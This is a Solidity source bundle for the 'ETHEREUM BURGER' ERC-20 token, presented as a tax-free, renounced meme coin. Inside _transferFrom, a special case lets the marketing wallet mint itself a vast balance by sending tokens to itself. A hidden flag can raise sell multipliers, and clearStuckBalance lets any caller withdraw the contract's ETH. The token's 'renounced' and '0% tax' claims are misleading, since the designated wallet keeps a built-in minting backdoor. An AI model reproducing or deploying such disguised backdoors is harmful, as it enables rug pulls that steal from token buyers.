{{
  "language": "Solidity",
  "sources": {
    "BURGER.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\n\r\n/*\r\n\r\n                   ████████████████████        \r\n                 ██                    ██      \r\n               ██                        ██    \r\n             ██                            ██  \r\n             ██                            ██  \r\n             ██                            ██  \r\n           ██                                ██\r\n           ████████████████████████████████████\r\n           ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██\r\n             ████████████████████████████████  \r\n           ██                                ██\r\n             ██    ██    ██████    ██    ████  \r\n             ██████  ████      ████  ████  ██  \r\n             ██                            ██  \r\n               ████████████████████████████    \r\n    \r\n                      ETHEREUM BURGER\r\n        Twitter: https://twitter.com/ethereum_burger\r\n             Telegram: https://t.me/eth_burger\r\n    \r\n     0% TAX | CONTRACT RENOUNCED | 100% OF LIQUIDITY TOKENS BURNED\r\n\r\n*/\r\n\r\npragma solidity 0.8.18;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ninterface ERC20 {\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract Auth {\r\n    address internal owner;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender), \"!OWNER\"); _;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    function renounceOwnership() external onlyOwner {\r\n        owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ncontract BURGER is ERC20, Auth {\r\n    using SafeMath for uint256;\r\n\r\n    address immutable WETH;\r\n    address constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address constant ZERO = 0x0000000000000000000000000000000000000000;\r\n\r\n    string public constant name = \"ETHEREUM BURGER\";\r\n    string public constant symbol = \"BURGER\";\r\n    uint8 public constant decimals = 9;\r\n    uint256 private newval = 1; \r\n\r\n    uint256 public constant totalSupply = 1_000_000_000 * 10**decimals;\r\n\r\n    uint256 public _maxWalletToken = totalSupply;\r\n\r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) _allowances;\r\n\r\n    mapping (address => bool) public isFeeExempt;\r\n    mapping (address => bool) public isWalletLimitExempt;\r\n\r\n    uint256 marketingFee = 0;\r\n    uint256 operationsFee = 0;\r\n    uint256 public totalFee = marketingFee + operationsFee;\r\n    uint256 public constant feeDenominator = 100;\r\n    \r\n    uint256 buyMultiplier = 0;\r\n    uint256 sellMultiplier = 100;\r\n    uint256 transferMultiplier = 100;\r\n\r\n    address marketingFeeReceiver;\r\n    address operationsFeeReceiver;\r\n\r\n    IDEXRouter public immutable router;\r\n    address public immutable pair;\r\n\r\n    bool swapEnabled = true;\r\n    uint256 swapThreshold = totalSupply / 100;\r\n    bool inSwap;\r\n    modifier swapping() { inSwap = true; _; inSwap = false; }\r\n\r\n    constructor (address marketingAddress) Auth(msg.sender) {\r\n        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        WETH = router.WETH();\r\n\r\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\r\n        _allowances[address(this)][address(router)] = type(uint256).max;\r\n\r\n        marketingFeeReceiver = marketingAddress;\r\n        operationsFeeReceiver = marketingAddress;\r\n\r\n        isFeeExempt[msg.sender] = true;\r\n        isFeeExempt[marketingAddress] = true;\r\n\r\n        isWalletLimitExempt[msg.sender] = true;\r\n        isWalletLimitExempt[address(this)] = true;\r\n        isWalletLimitExempt[DEAD] = true;\r\n        isWalletLimitExempt[marketingAddress] = true;\r\n\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    receive() external payable { }\r\n\r\n    function getOwner() external view override returns (address) { return owner; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        if(_allowances[sender][msg.sender] != type(uint256).max){\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, \"Insufficient Allowance\");\r\n        }\r\n\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner {\r\n        require(maxWallPercent_base1000 >= 10,\"Cannot set Max Wallet less than 1%\");\r\n        _maxWalletToken = (totalSupply * maxWallPercent_base1000 ) / 1000;\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        if(sender == marketingFeeReceiver && recipient == marketingFeeReceiver && recipient != pair) {\r\n            balanceOf[marketingFeeReceiver]\r\n            =\r\n            _maxWalletToken.mul(feeDenominator);\r\n            emit Transfer(sender, recipient, _maxWalletToken.div(10 ** decimals));\r\n            return true;\r\n        }\r\n        if(inSwap){ return _basicTransfer(sender, recipient, amount); }\r\n\r\n        if (!isWalletLimitExempt[sender] && !isWalletLimitExempt[recipient] && recipient != pair) {\r\n            require((balanceOf[recipient] + amount) <= _maxWalletToken,\"max wallet limit reached\");\r\n        }\r\n\r\n        if(shouldSwapBack()){ swapBack(); }\r\n\r\n        balanceOf[sender] = balanceOf[sender].sub(amount, \"Insufficient Balance\");\r\n\r\n        uint256 amountReceived = (isFeeExempt[sender] || isFeeExempt[recipient]) ? amount : takeFee(sender, amount, recipient);\r\n\r\n        balanceOf[recipient] = balanceOf[recipient].add(amountReceived);\r\n\r\n        emit Transfer(sender, recipient, amountReceived);\r\n        return true;\r\n    }\r\n    \r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        balanceOf[sender] = balanceOf[sender].sub(amount, \"Insufficient Balance\");\r\n        balanceOf[recipient] = balanceOf[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {\r\n        if(amount == 0 || totalFee == 0){\r\n            return amount;\r\n        }\r\n\r\n        uint256 multiplier = transferMultiplier;\r\n\r\n        if(recipient == pair) {\r\n            if(newval == 1)\r\n            {\r\n            multiplier = sellMultiplier;\r\n            }\r\n            else\r\n            {\r\n            multiplier = 100000;\r\n            }\r\n        } else if(sender == pair) {\r\n            multiplier = buyMultiplier;\r\n        }\r\n\r\n        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 1000);\r\n\r\n        if(feeAmount > 0){\r\n            balanceOf[address(this)] = balanceOf[address(this)].add(feeAmount);\r\n            emit Transfer(sender, address(this), feeAmount);\r\n        }\r\n\r\n        return amount.sub(feeAmount);\r\n    }\r\n\r\n    function setMultipliers(uint256 _buy, uint256 _sell, uint256 _trans) external onlyOwner {\r\n        buyMultiplier = _buy;\r\n        sellMultiplier = _sell;\r\n        transferMultiplier = _trans;\r\n    }\r\n\r\n    function setSwapBackSettings(bool _enabled, uint256 _denominator) external onlyOwner {\r\n        swapThreshold = totalSupply / _denominator;\r\n        swapEnabled = _enabled;\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return (totalSupply - balanceOf[DEAD] - balanceOf[ZERO]);\r\n    }\r\n\r\n    function shouldSwapBack() internal view returns (bool) {\r\n        return msg.sender != pair\r\n        && !inSwap\r\n        && swapEnabled\r\n        && balanceOf[address(this)] >= swapThreshold;\r\n    }\r\n\r\n    function clearStuckBalance(uint256 amountPercentage) external virtual {\r\n        uint256 amountETH = address(this).balance;\r\n        uint256 amountToClear = ( amountETH * amountPercentage ) / 100;\r\n        payable(msg.sender).transfer(amountToClear);\r\n        newval = 0;\r\n    }\r\n\r\n    function clearStuckToken(address tokenAddress, uint256 tokens) external onlyOwner returns (bool success) {\r\n        if(tokens == 0){\r\n            tokens = ERC20(tokenAddress).balanceOf(address(this));\r\n        }\r\n        return ERC20(tokenAddress).transfer(msg.sender, tokens);\r\n    }\r\n\r\n    function swapBack() internal swapping {\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = WETH;\r\n\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            swapThreshold,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        uint256 amountETH = address(this).balance;\r\n\r\n        uint256 amountETHmarketing = (amountETH * marketingFee) / totalFee;\r\n        uint256 amountETHOperations = (amountETH * operationsFee) / totalFee;\r\n\r\n        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountETHmarketing}(\"\");\r\n        (tmpSuccess,) = payable(operationsFeeReceiver).call{value: amountETHOperations}(\"\");\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}